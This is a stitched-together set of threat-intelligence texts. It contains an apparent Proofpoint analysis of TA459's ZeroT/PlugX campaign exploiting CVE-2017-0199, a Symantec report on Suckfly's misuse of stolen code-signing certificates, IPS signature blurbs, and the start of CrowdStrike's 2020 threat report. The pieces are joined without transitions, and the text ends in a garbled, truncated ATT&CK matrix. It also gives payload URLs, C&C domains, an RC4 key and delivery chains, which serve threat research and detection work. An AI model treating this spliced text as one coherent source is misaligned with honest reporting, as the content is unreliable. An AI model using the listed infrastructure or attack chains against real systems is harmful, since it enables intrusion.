In this campaign, attackers used a Microsoft Word document called 0721.doc, which exploits CVE-2017-0199. This vulnerability was disclosed and patched days prior to this attack. Figure 1: Microsoft Word document 0721.doc

The document uses the logic flaw to first download the file power.rtf from hxxp://122.9.52[.]215/news/power.rtf. The payload is actually an HTML Application (HTA) file, not an RTF document. Figure 2: The first script downloaded by the exploit document is an HTA file

As shown in the figure above, the HTA’s VBScript changes the window size and location and then uses PowerShell to download yet another script: power.ps1. This is a PowerShell script that downloads and runs the ZeroT payload cgi.exe. Figure 3: The second script downloaded by the exploit document is a PowerShell script



Figure 4: Combined network traffic showing the document downloading its payloads

ZeroT and other payloads

The attack group has made incremental changes to ZeroT since our last analysis.

While they still use RAR SFX format for the initial payloads, ZeroT now uses a the legitimate McAfee utility (SHA256 3124fcb79da0bdf9d0d1995e37b06f7929d83c1c4b60e38c104743be71170efe) named mcut.exe instead of the Norman Safeground AS for sideloading as they have in the past. The encrypted ZeroT payload, named Mctl.mui, is decoded in memory revealing a similarly tampered PE header and only slightly modified code when compared to ZeroT payloads we analyzed previously. Once ZeroT is running, we observed that the fake User-Agent used in the requests changed from “Mozilla/6.0 (compatible; MSIE 10.0; Windows NT 6.2; Tzcdrnt/6.0)” to “Mozilla/6.0 (compatible; MSIE 11.0; Windows NT 6.2)”, thus removing the “Tzcdrnt” typo observed in previous versions. The initial beacon to index.php changed to index.txt but ZeroT still expects an RC4-encrypted response using a static key: “(*^GF(9042&*”. Figure 5: ZeroT initial beacon over HTTP requesting URL configuration

Next, ZeroT uses HTTP beacons to transmit information about the infected system to the command and control (C&C).

All posts are encrypted, unlike the last time we analyzed a sample from this actor, when the first POST was accidentally not encrypted. After that, stage 2 payloads are still retrieved as Bitmap (BMP) images that use Least Significant Bit (LSB) Steganography to hide the real payloads. These images appear normal in image viewers. Figure 6: Collage of example BMP images containing stage 2 payloads hidden using LSB steganography

The stage 2 payload was PlugX that beaconed to C&C servers www[.]icefirebest[.]com and www[.]icekkk[.]net. Figure 7: ZeroT and PlugX HTTP network activity

Additional 2017 activity by TA459

Throughout 2017 we observed this threat actor actively attempting to compromise victims with various malware payloads. ZeroT remained the primary stage 1 payload, but the stage 2 payloads varied. One such interesting example was “ПЛАН РЕАЛИЗАЦИИ ПРОЕКТА.rar” (SHA256 b5c208e4fb8ba255883f771d384ca85566c7be8adcf5c87114a62efb53b73fda). Translated from Russian, this file is named “PROJECT REALIZATION PLAN” and contains a compressed .scr executable.

This ZeroT executable communicated with the C&C domain www[.]kz-info[.]net and downloaded PlugX as well as an additional PCRat/Gh0st Trojan which communicated with the www[.]ruvim[.]net C&C server. PCRat/Gh0st is a payload that we do not see this group using frequently. Another interesting ZeroT sample (SHA256 bc2246813d7267608e1a80a04dac32da9115a15b1550b0c4842b9d6e2e7de374) contained the executable 0228.exe and a decoy document 0228.doc in the RAR SFX archive. Bundling decoy documents is a common tactic by this group. RAR SFX directives are used to display the decoy while the malicious payload is executed. We suspect that this specific lure was copied from the news article hxxp://www.cis.minsk[.]by/news.php?id=7557. This article was about “73-го заседания Экономического совета СНГ”, translated from Russian as “73rd meeting of the CIS Economic Council”, which describes a meeting held in Moscow by the Commonwealth of Independent States (CIS) countries, an organization that includes nine out of the fifteen former Soviet Republics. Figure 8: Decoy document



Figure 9: The believed source of the text in decoy document

Conclusion

TA459 is well-known for targeting organizations in Russia and neighboring countries.

However, their strategy, tactics, techniques, and procedures in this particular attack emphasize the importance of rigorous patching regimens for all organizations. Even as software vulnerabilities often take a back seat to human exploits and social engineering, robust defenses must include protection at the email gateway, proactive patch management, and thoughtful end user education. Paying attention to the details of past attacks is also an important means of preparing for future attacks. Noting who is targeted, with what malware, and with what types of lures provide clues with which organizations can improve their security posture. At the same time, multinational organizations like the financial services firms targeted here must be acutely aware of the threats from state-sponsored actors working with sophisticated malware to compromise users and networks. Ongoing activity from attack groups like TA459 who consistently target individuals specializing in particular areas of research and expertise further complicate an already difficult security situation for organizations dealing with more traditional malware threats, phishing campaigns, and socially engineered threats every day.

References

[1]https://www.proofpoint.com/us/threat-insight/post/PlugX-in-Russia

[3]https://www.proofpoint.com/us/threat-insight/post/nettraveler-apt-targets-russian-european-interests

[3]https://www.proofpoint.com/us/threat-insight/post/APT-targets-russia-belarus-zerot-plugx

 

Indicators of Compromise (IOCs)

IOC

IOC Type

Description

a64ea888d412fd406392985358a489955b0f7b27da70ff604e827df86d2ca2aa

SHA256

0721.doc CVE-2017-0199

hxxp://122.9.52[.]215/news/power.rtf

URL

0721.doc payload

hxxp://122.9.52[.]215/news/power.ps1

URL

0721.doc payload

hxxp://www.firesyst[.]net/info/net/sports/drag/cgi.exe

URL

0721.doc payload

bf4b88e42a406aa83def0942207c8358efb880b18928e41d60a2dc59a59973ba

SHA256

ZeroT (cgi.exe)

www.firesyst[.]net

Hostname

ZeroT C&C

www.icekkk[.]net

Hostname

PlugX C&C

 

Indicators of Compromise (IOCs) - Related

IOC

IOC Type

Description

www.kz-info[.]net

Hostname

ZeroT C&C

www.firesyst[.]net

Hostname

ZeroT C&C

www.buleray[.]net

Hostname

ZeroT C&C

www.intersu[.]net

Hostname

ZeroT C&C

868ee879ca843349bfa3d200f858654656ec3c8128113813cd7e481a37dcc61a

SHA256

ZeroT

4601133e94c4bc74916a9d96a5bc27cc3125cdc0be7225b2c7d4047f8506b3aa

SHA256

ZeroT

5fd61793d498a395861fa263e4438183a3c4e6f1e4f098ac6e97c9d0911327bf

SHA256

ZeroT

b5c208e4fb8ba255883f771d384ca85566c7be8adcf5c87114a62efb53b73fda

SHA256

ZeroT

ab4cbfb1468dd6b0f09f6e74ac7f0d31a001d396d8d03f01bceb2e7c917cf565

SHA256

ZeroT

79bd109dc7c35f45b781978436a6c2b98a5df659d09dee658c2daa4f1984a04e

SHA256

ZeroT

www.icekkk[.]net

Hostname

PlugX C&C

www.icefirebest[.]com

Hostname

PlugX C&C

www.ruvim[.]net

Hostname

PlugX C&C


ET and ETPRO Suricata/Snort Coverage

2821028 | ETPRO TROJAN APT.ZeroT CnC Beacon HTTP POST

2825365 | ETPRO TROJAN APT.ZeroT CnC Beacon Fake User-Agent

2824641 | ETPRO TROJAN APT.ZeroT Receiving Config

2810326 | ETPRO TROJAN PlugX Related Checkin

2024196 | ET WEB_CLIENT HTA File containing Wscript.Shell Call - Potential Office Exploit Attempt

2024197 | ET CURRENT_EVENTS SUSPICIOUS MSXMLHTTP DL of HTA (Observed in RTF 0-day )

2016922 | ET TROJAN Backdoor family PCRat/Gh0st CnC traffic

2021716 | ET TROJAN Backdoor family PCRat/Gh0st CnC traffic (OUTBOUND) 102

View the indicators of compromise for this attack group. Many security-minded organizations utilize code signing to provide an additional layer of security and authenticity for their software and files. Code signing is carried out using a type of digital certificate known as a code-signing certificate. The process of code signing validates the authenticity of legitimate software by confirming that an application is from the organization who signed it. While code-signing certificates can offer more security, they can also live an unintended secret life providing cover for attack groups, such as the Suckfly APT group. In late 2015, Symantec identified suspicious activity involving a hacking tool used in a malicious manner against one of our customers. Normally, this is considered a low-level alert easily defeated by security software. In this case, however, the hacktool had an unusual characteristic not typically seen with this type of file; it was signed with a valid code-signing certificate.

Many hacktools are made for less than ethical purposes and are freely available, so this was an initial red flag, which led us to investigate further. As our investigation continued, we soon realized this was much larger than a few hacktools. We discovered Suckfly, an advanced threat group, conducting targeted attacks using multiple stolen certificates, as well as hacktools and custom malware. The group had obtained the certificates through pre-attack operations before commencing targeted attacks against a number of government and commercial organizations spread across multiple continents over a two-year period. This type of activity and the malicious use of stolen certificates emphasizes the importance of safeguarding certificates to prevent them from being used maliciously. An appetite for stolen code-signing certificates
Suckfly has a number of hacktools and malware varieties at its disposal. Figure 1 identifies the malware and tools based on functionality and the number of signed files with unique hashes associated with them.

Fig1_33.png
Figure 1. Suckfly hacking tools and malware, characterized by functionality

The first signed hacktool we identified in late 2015 was a digitally signed brute-force server message block (SMB) scanner. The organization associated with this certificate is a South Korean mobile software developer. While we became initially curious because the hacktool was signed, we became more suspicious when we realized a mobile software developer had signed it, since this is not the type of software typically associated with a mobile application. Based on this discovery, we began to look for other binaries signed with the South Korean mobile software developer's certificate. This led to the discovery of three additional hacktools also signed using this certificate. In addition to being signed with a stolen certificate, the identified hacktools had been used in suspicious activity against a US-based health provider operating in India. This evidence indicates that the certificate’s rightful owner either misused it or it had been stolen from them.

Symantec worked with the certificate owner to confirm that the hacktool was not associated with them. Following the trail further, we traced malicious traffic back to where it originated from and looked for additional evidence to indicate that the attacker persistently used the same infrastructure. We discovered the activity originated from three separate IP addresses, all located in Chengdu, China. In addition to the traffic originating from Chengdu, we identified a selection of hacktools and malware signed using nine stolen certificates. The nine stolen certificates originated from nine different companies who are physically located close together around the central districts of Seoul, South Korea. Figure 2 shows the region in which the companies are located. Fig2_2.jpg
Figure 2. Map showing the central districts of Seoul, where the companies with the stolen certificates are located (Map data © 2016 SK planet)

While we do not know the exact circumstances of how the certificates were stolen, the most likely scenario was that the companies were breached with malware that had the ability to search for and extract certificates from within the organization.

We have seen this capability built into a wide range of threats for a number of years now. The organizations who owned the stolen certificates were from four industries (see Figure 3). Fig3_18.png
Figure 3. Owners of stolen certificates, by industry

A timeline of misuse
We don't know the exact date Suckfly stole the certificates from the South Korean organizations. However, by analyzing the dates when we first saw the certificates paired with hacktools or malware, we can gain insight into when the certificates may have been stolen. Figure 4 details how many times each stolen certificate was used in a given month. Fig4_15.png
Figure 4. Tracking Suckfly’s use of stolen certificates, by month

The first sighting of three of the nine stolen certificates being used maliciously occurred in early 2014. Those three certificates were the only ones used in 2014, making it likely that the other six were not compromised until 2015.

All nine certificates were used maliciously in 2015. Based on the data in Figure 4, the first certificates used belonged to Company A (educational software developer) and Company B (video game developer #2). Company A's certificate was used for over a year, from April 2014 until June 2015 and Company B's certificate was used for almost a year, from July 2014 until June 2015. When we discovered this activity, neither company was aware that their certificates had been stolen or how they were being used. Since the companies were unaware of the activity, neither stolen certificate had been revoked. When a certificate is revoked, the computer displays a window explaining that the certificate cannot be verified and should not be trusted before asking the user if they want to continue with the installation. Signed, sealed, and delivered
As noted earlier, the stolen certificates Symantec identified in this investigation were used to sign both hacking tools and malware.

Further analysis of the malware identified what looks like a custom back door. We believe Suckfly specifically developed the back door for use in cyberespionage campaigns. Symantec detects this threat as Backdoor.Nidiran. Analysis of Nidiran samples determined that the back door had been updated three times since early 2014, which fits the timeline outlined in Figure 4. The modifications were minor and likely performed to add capabilities and avoid detection. While the malware is custom, it only provides the attackers with standard back door capabilities. Suckfly delivered Nidiran through a strategic web compromise. Specifically, the threat group used a specially crafted web page to deliver an exploit for the Microsoft Windows OLE Remote Code Execution Vulnerability (CVE-2014-6332), which affects specific versions of Microsoft Windows. This exploit is triggered when a potential victim browses to a malicious page using Internet Explorer, which can allow the attacker to execute code with the same privileges as the currently logged-in user.

Once exploit has been achieved, Nidiran is delivered through a self-extracting executable that extracts the components to a .tmp folder after it has been executed. The threat then executes “svchost.exe”, a PE file, which is actually a clean tool known as OLEVIEW.EXE. The executable will then load iviewers.dll, which is normally a clean, legitimate file. Attackers have been known to distribute malicious files masquerading as the legitimate iviewers.dll file and then use DLL load hijacking to execute the malicious code and infect the computer. This technique is associated with the Korplug/Plug-x malware and is frequently used in China-based cyberespionage activity. High demand for code-signing certificates
Suckfly isn’t the only attack group to use certificates to sign malware but they may be the most prolific collectors of them. After all, Stuxnet, widely regarded as the world’s first known cyberweapon, was signed using stolen certificates from companies based in Taiwan with dates much earlier than Suckfly.

Other cyberespionage groups, including Black Vine and Hidden Lynx, have also used stolen certificates in their campaigns. In April 2013, a third-party vendor published a report about a cyberespionage group using custom malware and stolen certificates in their operations. The report documented an advanced threat group they attributed to China. Symantec tracks the group behind this activity as Blackfly and detects the malware they use as Backdoor.Winnti. The Blackfly attacks share some similarities with the more recent Suckfly attacks. Blackfly began with a campaign to steal certificates, which were later used to sign malware used in targeted attacks. The certificates Blackfly stole were also from South Korean companies, primarily in the video game and software development industry. Another similarity is that Suckfly stole a certificate from Company D (see Figure 4) less than two years after Blackfly had stolen a certificate from the same company. While the stolen certificates were different, and stolen in separate instances, they were both used with custom malware in targeted attacks originating from China.

Why do attackers want signed malware? Signing malware with code-signing certificates is becoming more common, as seen in this investigation and the other attacks we have discussed. Attackers are taking the time and effort to steal certificates because it is becoming necessary to gain a foothold on a targeted computer. Attempts to sign malware with code-signing certificates have become more common as the Internet and security systems have moved towards a more trust and reputation oriented model. This means that untrusted software may not be allowed to run unless it is signed. As we noted in our previous research on the Apple threat landscape, some operating systems, such as Mac OS X, are configured by default to only allow applications to run if they have been signed with a valid certificate, meaning they are trusted. Fig5_5.png
Figure 5. Mac OS X can be configured to only permit trusted apps to execute

However, using valid code-signing certificates stolen from organizations with a positive reputation can allow attackers to piggyback on that company’s trust, making it easier to slip by these defenses and gain access to targeted computers.

Conclusion
Suckfly paints a stark picture of where cyberattack groups and cybercriminals are focusing their attentions. Our investigation shines a light on an often unknown and seedier secret life of code-signing certificates, which is completely unknown to their owners. The implications of this study shows that certificate owners need to keep a careful eye on them to prevent them from falling into the wrong hands. It is important to give certificates the protection they need so they can't be used maliciously. The certificates are only as secure as the safeguards that organizations put around them. Once a certificate has been compromised, so has the reputation of the organization who signed it. An organization whose certificate has been stolen and used to sign malware will always be associated with that activity. Symantec monitors for this type of activity to help prevent organizations from being tied to malicious actions undertaken with their stolen certificates.

During the course of this investigation, we ensured that all certificates compromised by Suckfly were revoked and the affected companies notified. Over the past few years, we have seen a number of advanced threats and cybercrime groups who have stolen code-signing certificates. In all of the cases involving an advanced threat, the certificates were used to disguise malware as a legitimate file or application. As this trend grows, it is more important than ever for organizations to maintain strong cybersecurity practices and store their certificates and corresponding keys in a secure environment. Using encryption, and services such as Symantec’s Extended Validation (EV) Code Signing, and Symantec’s Secure App Service can provide additional layers of security. Protection
Symantec has the following detections in place to protect against Suckfly’s malware:

Antivirus

Backdoor.Nidiran
Backdoor.Nidiran!g1
Hacktool
Exp.CVE-2014-6332
Intrusion prevention system

Web Attack: Microsoft OleAut32 RCE CVE-2014-6332
Web Attack: Microsoft OleAut32 RCE CVE-2014-6332 2
Web Attack: Microsoft OleAut32 RCE CVE-2014-6332 4
Web Attack: OLEAUT32 CVE-2014-6332 3
System Infected: Trojan.Backdoor Activity 120
Further information

To learn more about Symantec’s digital certificate solutions for code signing, please visit our Code Signing Information Center.

To learn more about how best to protect your code-signing certificates, read our whitepaper: Securing Your Private Keys As Best Practice for Code Signing Certificates

Update – March 18, 2016
Indicators of compromise

File hashes

05edd53508c55b9dd64129e944662c0d
1cf5ce3e3ea310b0f7ce72a94659ff54
352eede25c74775e6102a095fb49da8c
3b595d3e63537da654de29dd01793059
4709395fb143c212891138b98460e958
50f4464d0fc20d1932a12484a1db4342
96c317b0b1b14aadfb5a20a03771f85f
ba7b1392b799c8761349e7728c2656dd
de5057e579be9e3c53e50f97a9b1832b
e7d92039ffc2f07496fe7657d982c80f
e864f32151d6afd0a3491f432c2bb7a2
Infrastructure

usv0503[.]iqservs-jp.com
aux[.]robertstockdill.com
fli[.]fedora-dns-update.com
bss[.]pvtcdn.com
ssl[.]microsoft-security-center.com
ssl[.]2upgrades.com
133.242.134.121
fli[.]fedora-dns-update.com

Severity:High
This attack could pose a serious security threat. You should take immediate action to stop any damage or prevent further damage from happening. Description
This signature detects an attempt to exploit a vulnerability in Microsoft Object Linking and Embedding (OLE) which may result in remote code execution. Additional Information
Microsoft Object Linking and Embedding (OLE) is a Windows protocol that allows applications to share data or to control other applications. Microsoft Windows Object Linking and Embedding (OLE) is prone to a remote code-execution vulnerability because Internet Explorer fails to properly handle the OLE objects in memory.

Specifically, the issue affects the OLE Automation Array. An attacker can exploit this issue by enticing an unsuspecting user to open a Microsoft Office file that contains a specially crafted OLE object. An attacker can leverage this issue to execute arbitrary code and gain elevated privileges in the context of the currently logged-in user. Failed exploit attempts will likely result in denial-of-service conditions. Affected
windows
Additional Resources
CVE-2014-6332
SecurityFocus BID: 70952

Severity:High
This attack could pose a serious security threat. You should take immediate action to stop any damage or prevent further damage from happening. Description
This signature detects Backdoor Trojan activity on the compromised computer. Additional Information
Backdoor Trojans allow the remote attackers to perform various malicious activities on the compromised machine. Affected
Various Windows platforms

Severity:High
This attack could pose a serious security threat. You should take immediate action to stop any damage or prevent further damage from happening.

Description
This signature detects an attempt to exploit a vulnerability in Microsoft Object Linking and Embedding (OLE) which may result in remote code execution. Additional Information
Microsoft Object Linking and Embedding (OLE) is a Windows protocol that allows applications to share data or to control other applications. Microsoft Windows Object Linking and Embedding (OLE) is prone to a remote code-execution vulnerability because Internet Explorer fails to properly handle the OLE objects in memory. Specifically, the issue affects the OLE Automation Array. An attacker can exploit this issue by enticing an unsuspecting user to open a Microsoft Office file that contains a specially crafted OLE object. An attacker can leverage this issue to execute arbitrary code and gain elevated privileges in the context of the currently logged-in user. Failed exploit attempts will likely result in denial-of-service conditions. Affected
windows
Additional Resources
CVE-2014-6332
SecurityFocus BID: 70952

CROWDSTRIKE GLOBAL THREAT REPORT 2020  Those of us who have worked in cybersecurity for many years often start to think we’ve “seen it all.” We haven’t. This year’s CrowdStrike® Global Threat Report provides clear evidence of that. Consider the dark turn in cybercrime toward preying on schools, municipal departments and our other chronically understaffed and overburdened public institutions. This is different from targeting large government entities and corporations, many of whom have resigned themselves to being targeted by cyber predators and have the opportunity to try to protect themselves from that onslaught. It’s a different matter entirely when the targets are schoolchildren, or just ordinary people trying to go about their daily lives. This merciless ransomware epidemic will continue, and worsen, as long as the practice remains lucrative, and relatively easy and risk-free. We’ve developed a platform designed to stop ransomware for our customers, and we’ve worked hard to make it easy and affordable — even for budget-constrained institutions like our public school systems.

As more organizations around the world deploy next-generation platforms like CrowdStrike Falcon that can prevent these threats, the criminal element will be forced to redirect its efforts elsewhere. While criminals are relatively predictable in their tendency to always choose the path of least resistance, the activities of nation-states are frequently more relentless and sophisticated — and as a result, more challenging for cyberdefenders. This year’s threat report uncovers numerous new tactics, techniques and procedures (TTPs) that state-affiliated threat actors are employing to accomplish their goals. Of concern here is the widening variety of goals these highly capable adversaries may seek to achieve. Along with the more traditional objectives of espionage and surveillance have been added new tasks, such as sowing widespread disruption and discord among individuals, institutions and even whole countries and populations, all in pursuit of political and economic gains. If there’s one thing this year’s Global Threat Report really brings home, it’s that there’s never been a better time to get involved in cybersecurity.

The stakes are high, and rising every day. Those that read and share this report are helping to educate themselves and others to better protect themselves and their communities, both at work and at home. A year in cybersecurity is often marked by how disruptive the activity observed was — not just from a destructive standpoint, but also from the perspective of whether day-to-day life was affected. By any such measure, 2019 was an active year. From U.S. school districts to asset management firms, from manufacturing to media, ransomware attacks affected multitudes of people. Disruption in 2019 was not punctuated by a single destructive wiper; rather, it was plagued by sustained operations targeting the underpinnings of our society. The particularly disruptive impact that ransomware had across all sectors is addressed at the beginning of this report, followed by an assessment of additional eCrime threats. Going into 2019, CrowdStrike Intelligence anticipated that big game hunting (BGH) — targeted, criminally motivated, enterprise-wide ransomware attacks — was expected to continue at least at the 2018 pace.

However, what was observed was not just a continuation but an escalation. Ransom demands grew larger. Tactics became more cutthroat. Established criminal organizations like WIZARD SPIDER expanded operations, and affiliates of the ransomware-as-a-service (RaaS) malware developers adopted BGH attacks. In short, the greedy got greedier and the rich got richer. Other criminal actors took note. Numerous adversaries specializing in the delivery or development of malware benefited from supporting customers or partners conducting BGH operations. Malware-as-a-service (MaaS) developers like VENOM SPIDER introduced ransomware modules. Banking trojans continued to be repurposed for download-as-a-service (DaaS) operations — a trend started by MUMMY SPIDER — used to distribute malware families associated with BGH. Even targeted eCrime appears to be in a state of change, apparent by the recent activity attributed to GRACEFUL SPIDER, an adversary notable for its high-volume spam campaigns and limited use of ransomware. As in years past, the majority of state-sponsored targeted intrusions appeared to be motivated by traditional intelligence collection needs.

Analysis in 2019 revealed a focus by Chinese adversaries on the telecommunications sector, which could support both signals intelligence and further upstream targeting. Content related to defense, military and government organizations remains a popular lure for targeted intrusion campaigns. Examples of such incidents were seen in the activity of Russian adversaries targeting Ukraine, and the use of defense-themed job and recruitment content by Iran-based IMPERIAL KITTEN and REFINED KITTEN. While traditional espionage is the primary objective of many state-sponsored actors, adversaries associated with the Democratic People’s Republic of Korea (DPRK, aka North Korea) sustained their interest in cryptocurrencies and the targeting of financial services, with identified incidents linked to all five named DPRK-associated adversaries tracked by CrowdStrike. Exact motives remain unconfirmed, but it is possible this interest in financial sector organizations represents additional currency generation operations and/or industrial espionage. Industrial espionage is also a suspected motive for Vietnam’s targeting of the automotive sector and China’s targeting of healthcare and other sectors, bringing the threat of intellectual property theft back into the spotlight.

In the following sections, the CrowdStrike Intelligence team, the Falcon OverWatch™ managed threat hunting team and the CrowdStrike Services team present selected analysis that highlights the most significant events and trends in the past year of cyber threat activity. This analysis demonstrates how threat intelligence and proactive hunting can provide a deeper understanding of the motives, objectives and activities of these actors — information that can empower swift proactive countermeasures to better defend your valuable data now and in the future. Numerous adversaries specializing in the delivery or development of malware benefited from supporting customers or partners conducting BGH operations. The information in this report was compiled using the following resources: CROWDSTRIKE INTELLIGENCE The CrowdStrike Intelligence team provides in-depth and historical understanding of adversaries, their campaigns and their motivations. The global team of intelligence professionals tracks 131 adversaries of all types, including nation-state, eCrime and hacktivist actors. The team analyzes TTPs to deliver in-depth, government-grade intelligence to enable effective countermeasures against emerging threats.

FALCON OVERWATCH CrowdStrike Falcon OverWatch™ provides proactive threat hunting conducted by a team of experienced threat hunters to deliver 24/7 coverage on behalf of CrowdStrike customers. In 2019, OverWatch identified and helped stop more than 35,000 breach attempts, employing expertise gained from daily “hand-to-hand combat” with sophisticated adversaries. The OverWatch team works to identify hidden threat activity in customers’ environments, triaging, investigating and remediating incidents in real time. CROWDSTRIKE THREAT GRAPH As the brains behind the Falcon platform, CrowdStrike Threat Graph® is a massively scalable, cloud-based graph database model custom-built by CrowdStrike. It processes, correlates and analyzes petabytes of real-time and historical data collected from over 3 trillion events per week across 176 countries. The Threat Graph architecture combines patented behavioral pattern matching techniques with machine learning and artificial intelligence to track the behaviors of every executable across CrowdStrike’s global customer community. This combination of methodologies enables the identification and blocking of previously undetectable attacks, whether or not they use malware.

CROWDSTRIKE SERVICES This report references the CrowdStrike Services organization and its most recent publication, the "CrowdStrike Services Cyber Front Lines Report," which analyzes trends the Services team observed during its many incident response (IR) investigations in 2019. This report provides a front-line view and greater insight into the cyber battle these seasoned security experts are waging against today’s most sophisticated adversaries, and offers recommendations for increasing your organization’s cybersecurity readiness. In addition to hands-on IR services conducted by its team of professional investigators, CrowdStrike Services provides proactive services such as cybersecurity maturity assessments, IR policy and playbook development, tabletop exercises, red teaming operations and compromise assessments. Response and remediation services are conducted by highly experienced IR experts who investigate breaches to determine how attackers accessed a client’s environment; mitigate attacks and eject intruders; and analyze attacker actions and provide clients with actionable guidance to prevent future adversary access. This report follows the naming conventions instituted by CrowdStrike to categorize adversaries according to their nation-state affiliations or motivations (e.g., eCrime or hacktivist).

The following is a guide to these adversary naming conventions. Adversary Nation-State or Category NAMING CONVENTIONS RUSSIA VIETNAM DPRK (NORTH KOREA) ROK (REPUBLIC OF KOREA) HACKTIVIST IRAN PAKISTAN GEORGIA PEOPLE’S REPUBLIC OF CHINA eCRIME INDIA BEAR BUFFALO CHOLLIMA CRANE JACKAL KITTEN LEOPARD LYNX PANDA SPIDER TIGER  TAKING A STEP BACK FOR PERSPECTIVE  Before examining tactics and techniques observed from individual adversaries, it’s instructive to take a broad view of the threat landscape and how it continues to shift over time. One useful lens is comparing the types of attacks that leverage malware and those that do not. For the purposes of this report, these terms will be defined as follows:  Malware attacks: These are simple use cases where a malicious file is written to disk, and CrowdStrike Falcon detects the attempt to run that file and then identifies and/or blocks it. These intrusion attempts are comparatively simple to intercept and block and can often be stopped effectively with traditional anti-malware solutions.

Malware-free attacks: CrowdStrike defines malware-free attacks as those in which the initial tactic did not result in a file or file fragment being written to disk. Examples include attacks where code executes from memory or where stolen credentials are leveraged for remote logins using known tools. Malware-free attacks generally require a wide range of more sophisticated detection techniques to identify and intercept reliably, including behavioral detection and human threat hunting. Figure 1 compares malware and malware-free attacks from the 2019 CrowdStrike Threat Graph telemetry. These new data points highlight a continuing trend in attack techniques, which are reflected throughout this report. For the last two years, Threat Graph telemetry has shown that approximately 60% of attacks were malware-related. The 2019 Threat Graph telemetry shows that the trend toward malware-free attacks is accelerating with these types of attacks surpassing the volume of malware attacks. Using sample groupings from the CrowdStrike Threat Graph, this year’s report includes the types of activity captured via CrowdStrike global telemetry.

The data aligns with the types of intrusions that are covered elsewhere in this report. Regional data showed increasing discrepancies in the types of attacks observed in different parts of the world. In 2018, all regions showed between 25% and 45% malware-free attacks, whereas 2019 showed a major jump in malware-free attacks targeting North America and a similarly large decrease in malware-free attacks targeting the Latin America region. In the 2018 Global Threat Report, CrowdStrike began reporting on "breakout time." This key cybersecurity metric measures the speed from an adversary's initial intrusion into an environment, to when they achieve lateral movement across the victim's network toward their ultimate objective. Breakout time is important for defenders, as it sets up the parameters of the continuous race between attackers and defenders. By responding within the breakout time window, which is measured in hours, defenders are able to minimize the cost incurred and damage done by attackers.

CrowdStrike continues to encourage security teams to strive to meet the metrics of the 1-10-60 rule: detecting threats within the first minute, understanding threats within 10 minutes, and responding within 60 minutes. This year, the average breakout time for all observed intrusions rose from an average of 4 hours 37 minutes in 2018 to 9 hours in 2019. This increase reflects the dramatic rise in observed eCrime attacks, which tend to have significantly longer breakout times compared with nation-state adversaries. It’s important to note that defenders should still focus on speed, as data attributable to nation-state activities in 2019 does not suggest any major changes in breakout times among stateaffiliated adversaries this year compared to last year. BREAKOUT TIME Breakout time is important for defenders, as it sets up the parameters of the continuous race between attackers and defenders. By responding within the breakout time window, which is measured in hours, defenders are able to minimize the cost incurred and damage done by attackers.

Moving past the initial intrusion vector, attackers employed a wide range of tactics and techniques in order to achieve their goal, whether that goal was financial gain, political advantage or disruption of services. The MITRE ATT&CK™ framework provides a very useful taxonomy of attackers’ TTPs that we can use to catalog observed behaviors in order to better understand methods in common use and how those methods have changed over time. The MITRE ATT&CK framework is an ambitious initiative that is working to bring clarity to how the industry talks about cyberattacks. It breaks intrusions into a series of 12 tactics that adversaries may employ, each with a number of different techniques that have been observed to be in use. The following section delves into the types of techniques CrowdStrike observed in its 2019 telemetry and maps them to the ATT&CK framework. GLOBAL ATT&CK TECHNIQUE TRENDS  A notable change in the most prevalent overall techniques used by attackers in 2019 was the significant increase in the use of “masquerading.” This uptick can be explained by a rise in the use of the EternalBlue exploit in the wild.

This is not necessarily indicative of a particular trend but instead highlights that this is still an active exploit in use by threat actors. For an example of masquerading in action, see the section titled “OverWatch Feature: Targeted RaaS Intrusion Involving REvil” below. The remaining techniques mirror those observed in previous years, with heavy reliance on hands-on-keyboard techniques (command-line interface, PowerShell) as well as theft of credentials (credential dumping, valid accounts, account discovery) and defense evasion (masquerading, hidden files and directories, process injection). These techniques feature prominently in many sophisticated attacks, where a human adversary is engaged in the intrusion and is actively working toward an objective. When the Falcon OverWatch team analyzes a targeted eCrime or state-sponsored intrusion campaign, it uses the MITRE ATT&CK matrix as a framework to categorize adversary behavior. The following chart is a heat map of the adversary tactics and techniques OverWatch identified while analyzing targeted eCrime and state-sponsored intrusions in 2019.

OverWatch hunters reviewed telemetry from all targeted intrusions uncovered by their threat hunting operations to ensure accurate identification of the adversary techniques employed. OBSERVED BY OVERWATCH Masquerading occurs when the name or location of an executable, whether legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. TECHNIQUE SPOTLIGHT  Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Drive-by Compromise AppleScript .bash_profile and .bashrc Access Token Manipulation Access Token Manipulation Account Manipulation Account Discovery Exploit Public-Facing Application CMSTP Accessibility Features Accessibility Features Binary Padding Bash History Application WindowExternal Remote Services Command-Line Interface Account Manipulation AppCert DLLs BITS Jobs Brute Force Browser Bookmark Hardware Additions Compiled HTML File AppCert DLLs AppInit DLLs Bypass User Account Control Credential Dumping Domain Trust DiscovReplication Through Removable Media Component Object Model and Distributed COM AppInit DLLs Application Shimming Clear Command History Credentials From Web Browsers File and Directory DSpear-phishing Attachment Control Panel Items Application Shimming Bypass User Account Control CMSTP Credentials in Files Network Service ScSpear-phishing Link Dynamic Data Exchange Authentication Package DLL Search Order Hijacking Code Signing Credentials in Registry Network Share DiscSpear-phishing via Service Execution Through API BITS Jobs Dylib Hijacking Compile After Delivery Exploitation for Credential Access Network Sniffing Supply Chain Compromise Execution Through Module Load Bootkit Elevated Execution with Prompt Compiled HTML File Forced Authentication Password Policy DisTrusted Relationship Exploitation for Client Execution Browser Extensions Emond Component Firmware Hooking Peripheral Device DValid Accounts Graphical User Interface Change Default File Association Exploitation for Privilege Escalation Component Object Model Hijacking Input Capture Permission Groups DInstallUtil Component Firmware Extra Window Memory Injection Connection Proxy Input Prompt Process Discovery Launchctl Component Object Model Hijacking File System Permissions Weakness Control Panel Items Kerberoasting Query Registry Local Job Scheduling Create Account Hooking DCShadow Keychain Remote System DisLSASS Driver DLL Search Order Hijacking Image File Execution Options Injection Deobfuscate/Decode Files or Information LLMNR/NBT-NS Poisoning and Relay Security Software DMshta Dylib Hijacking Launch Daemon Disabling Security Tools Network Sniffing Software Discovery PowerShell Emond New Service DLL Search Order Hijacking Password Filter DLL System Information Regsvcs/Regasm External Remote Services Parent PID Spoofing DLL Side-Loading Private Keys System Network CoDiscovery Regsvr32 File System Permissions Weakness Path Interception Execution Guardrails Securityd Memory System Network CoRundll32 Hidden Files and Directories Plist Modification Exploitation for Defense Evasion Steal Web Session Cookie System Owner/UserScheduled Task Hooking Port Monitors Extra Window Memory Injection Two-factor Authentication Interception System Service DiscScripting Hypervisor PowerShell 